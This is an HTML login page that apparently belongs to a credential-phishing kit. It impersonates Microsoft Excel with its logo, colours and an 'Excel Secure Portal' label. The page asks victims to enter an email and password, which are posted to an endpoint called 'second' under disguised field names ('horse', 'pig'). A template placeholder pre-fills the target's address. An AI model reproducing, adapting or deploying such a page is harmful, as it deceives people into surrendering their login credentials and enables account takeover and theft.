<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sign in to view document</title>

  <!-- Excel-style Favicon (safe and spam-free) -->
  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/7/73/Microsoft_Excel_2013-2019_logo.svg" type="image/svg+xml">

  <style>
    :root {
      --excel-green: #217346;
      --excel-gray: #f0f0f0;
      --excel-white: #ffffff;
    }

    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      margin: 0;
      padding: 0;
    }

    body {
      background: url('https://i.imgur.com/fktvunG.png') no-repeat center center fixed;
      background-size: cover;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .login-wrapper {
      backdrop-filter: blur(10px);
      background-color: rgba(255, 255, 255, 0.88);
      border-radius: 12px;
      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
      padding: 40px 30px;
      width: 100%;
      max-width: 400px;
      border: 1px solid var(--excel-gray);
    }

    .logo-container {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
    }

    .logo-container img {
      width: 50px;
      height: 50px;
    }

    .login-title {
      text-align: center;
      font-size: 1.6rem;
      font-weight: bold;
      color: var(--excel-green);
      margin-bottom: 10px;
    }

    .subtitle {
      text-align: center;
      font-size: 0.95rem;
      color: #555;
      margin-bottom: 25px;
    }

    .form-group {
      margin-bottom: 18px;
    }

    label {
      display: block;
      margin-bottom: 6px;
      color: #333;
      font-weight: 600;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px 12px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 1rem;
      background-color: #f9f9f9;
      transition: border 0.2s;
    }

    input[type="text"]:focus,
    input[type="password"]:focus {
      border-color: var(--excel-green);
      outline: none;
    }

    .login-button {
      width: 100%;
      background-color: var(--excel-green);
      color: var(--excel-white);
      padding: 12px;
      border: none;
      border-radius: 6px;
      font-size: 1rem;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.2s;
    }

    .login-button:hover {
      background-color: #1a5e38;
    }

    .footer-text {
      text-align: center;
      font-size: 0.8rem;
      color: #666;
      margin-top: 20px;
    }
  </style>
</head>
<body>

  <div class="login-wrapper">
    <div class="logo-container">
      <img src="https://upload.wikimedia.org/wikipedia/commons/7/73/Microsoft_Excel_2013-2019_logo.svg" alt="Excel Logo" />
    </div>
    <div class="login-title">Sign in to view document</div>
    <div class="subtitle">Excel Secure Portal</div>

    <form action="second" method="post">
      <div class="form-group">
        <label for="username">Email or Username</label>
        <input type="text" id="username" name="horse" value="{{eman}}" autocomplete="username" required>
      </div>
      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="pig" autocomplete="current-password" required>
      </div>
      <button type="submit" class="login-button">Login</button>
    </form>

    
  </div>

</body>
</html>
